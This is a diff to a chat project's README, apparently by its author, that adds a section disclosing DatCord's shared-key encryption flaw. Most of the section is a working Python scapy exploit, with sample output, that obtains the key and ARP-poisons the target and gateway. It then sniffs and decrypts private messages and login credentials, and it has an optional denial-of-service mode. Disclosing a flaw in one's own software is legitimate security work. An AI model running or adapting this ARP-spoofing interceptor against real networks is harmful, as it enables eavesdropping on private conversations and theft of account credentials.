@@ -177,6 +177,140 @@ if not logged_in:
 ```
 Using `filter()` or `.replace()` are better alternatives to diminish the possibility of injections like these. The usage of `.strip()` to filter strings are also scattered across the main script, so if you geniunely use this project: change them!
 
+# DatCord is also vulnerable if everyone is using it on a local network. 
+Since there is only 1 encryption key used across the entire server, attackers can easily obtain it and conduct an ARP Spoofing attack to intercept incoming traffic from the target and gateway. DatCord data can then be obtained and decrypted with ease, meaning that the confidentiality of data and conversations have been compromised. Here's the exploit I wrote:
+```python
+from scapy.all import *
+from cryptography.fernet import Fernet
+import threading, time, sys
+"""
+###################################################################################
+#                   DatCord ARP-Spoof Vulnerability Exploit                       #
+#                     By DrSquidX (2 Years in the future)                         #
+# The original protocol to process encryption in DatCord is more or less useless. #
+# Any attacker on the network can obtain the encryption key, poison the ARP table #
+# on the target and gateway and intercept DatCord data in plaintext.              #
+###################################################################################
+"""
+def print_packet(packet):
+    ip_layer = packet.getlayer(IP)
+    tcp = packet.getlayer(TCP)
+    try:
+        pkt = session.decrypt(bytes(packet[TCP].payload)).decode().replace('\n','\\n')
+        if (ip_layer.src == target or ip_layer.src == server) and (ip_layer.dst == server or ip_layer.dst == target) and (tcp.dport == port or tcp.sport == port):
+            print(f"[*] New Packet: {ip_layer.src}:{tcp.sport} -> {ip_layer.dst}:{tcp.dport} - {pkt}")
+    except:
+        pass
+
+def spoof():
+    global spoof_c
+    print("[*] Began spoofing. DatCord TCP packets should be intercepted once spoofing begins.\n")
+    while spoof_c:
+        try:
+            if dos:
+                send(ARP(op=2, psrc=gateway, pdst=target, hwdst=target_mac),verbose=False)
+            send(ARP(op=2, psrc=target, pdst=gateway, hwdst=gateway_mac),verbose=False)
+            time.sleep(delay)
+        except KeyboardInterrupt:
+            if dos:
+                send(ARP(op=2, psrc=gateway, hwsrc=gateway_mac, pdst=target,hwdst=target_mac),verbose=False)
+            send(ARP(op=2, psrc=target, hwsrc=target_mac, pdst=target,hwdst=target_mac),verbose=False)
+            spoof_c = False
+try:
+    interface = sys.argv[1]
+    target, gateway = sys.argv[2], sys.argv[3]
+    server, port = sys.argv[4], int(sys.argv[5])
+    spoof_c = True
+    try:
+        delay = int(sys.argv[6])
+    except:
+        delay = 0.5
+    try:
+        dos = True if sys.argv[7] == "1" else False
+    except:
+        dos = False
+except:
+    print("[*] Invalid arguments! Only the delay and DoS arguments are optional.\n[*] Example: python3 exploit.py wlan0 192.168.1.101 192.168.1.1 192.168.1.100 8080 0.5 1")
+    sys.exit()
+"""
+#########################################################
+# Obtaining the MAC addresses of the target and gateway #
+#########################################################
+"""
+print("[*] Obtaining the MAC addresses of the target and gateway.")
+target_mac = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=target), verbose=False, timeout=2)[0][0][1].hwsrc
+gateway_mac = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=gateway), verbose=False, timeout=2)[0][0][1].hwsrc
+print(f"[*] Target: {target} -> {target_mac}")
+print(f"[*] Gateway: {gateway} -> {gateway_mac}\n")
+
+"""
+######################################################
+# Connecting to DatCord to obtain the encryption key #
+######################################################
+"""
+print("[*] Connecting to DatCord.")
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((server,port))
+banner = s.recv(1024)
+
+encryption_key = s.recv(10240)
+session = Fernet(encryption_key)
+print(f"[*] Extracted encryption key: {encryption_key}\n")
+
+login_msg = s.recv(10240)
+
+"""
+###########################################################################
+# Conducting an ARP Poisoning Attack to intercept traffic from the target #
+###########################################################################
+"""
+thr = threading.Thread(target=spoof)
+thr.start()
+
+print("[*] Started sniffing...")
+sniff(iface=interface, filter="ip", prn=print_packet)
+print("[*] Stoped sniffing.")
+
+"""
+###################################################################################
+# Extra measures to restore the ARP table if the 'spoof()' function is unable to. #
+###################################################################################
+"""
+spoof_c = False
+if dos:
+    send(ARP(op=2, psrc=gateway, hwsrc=gateway_mac, pdst=target,hwdst=target_mac),verbose=False)
+send(ARP(op=2, psrc=target, hwsrc=target_mac, pdst=target,hwdst=target_mac),verbose=False)
+```
+The exploit in action:
+```
+[*] Obtaining the MAC addresses of the target and gateway.
+[*] Target: 192.168.1.126 -> aa:bb:cc:dd:ee:ff
+[*] Gateway: 192.168.1.1 -> 12:34:56:78:9a:bc
+
+[*] Connecting to DatCord.
+[*] Extracted encryption key: b'7BDEQQDaFDnrbsqIgfa-fFS02rT0ZbeyxU2LDQ4XSjU='
+
+[*] Began spoofing. DatCord TCP packets should be intercepted once spoofing begins.
+
+[*] Started sniffing...
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(SERVER)]:\n[+] Log-In Commands For This server:\n[+] !login [username] [password]           - Logs into your account.\n[+] !register [username] [password]        - Registers your account to the server.
+[*] New Packet: 192.168.1.126:64015 -> 192.168.1.100:8080 - !login test p
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(SERVER)]: Successfully logged in!
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(DM)][(DatCord)]: hello there
+[*] New Packet: 192.168.1.126:64015 -> 192.168.1.100:8080 - !dm Datcord
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(SERVER)]: The Username specified is not online or is not registered in the database.
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(DM)][(DatCord)]: !closedm
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(DM)][(Bob)]: hello!
+[*] New Packet: 192.168.1.126:64015 -> 192.168.1.100:8080 - !dm Bob
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(SERVER)]: Opened a DM with Bob. You can directly speak to them privately!
+[*] New Packet: 192.168.1.126:64015 -> 192.168.1.100:8080 - Hi there!
+[*] New Packet: 192.168.1.126:64015 -> 192.168.1.100:8080 - These messages are supposed to be secure, right?
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(DM)][(Bob)]: Yep!
+[*] New Packet: 192.168.1.100:8080 -> 192.168.1.126:64015 - \n[(DM)][(Bob)]: Nobody should be able to see these messages :)
+[*] New Packet: 192.168.1.126:64015 -> 192.168.1.100:8080 - Woah
+```
+As you can see, these two unsuspecting test users are being spied on; where their communications are not quite secret. The exploit also intercepted the login packets for the user 'test', which means the attacker can now login to their account once they log off.
+
 # Every Feature Included(In a more straightforward way):
 * Secure Password Storage - Every password is stored inside of an SQL Database
 
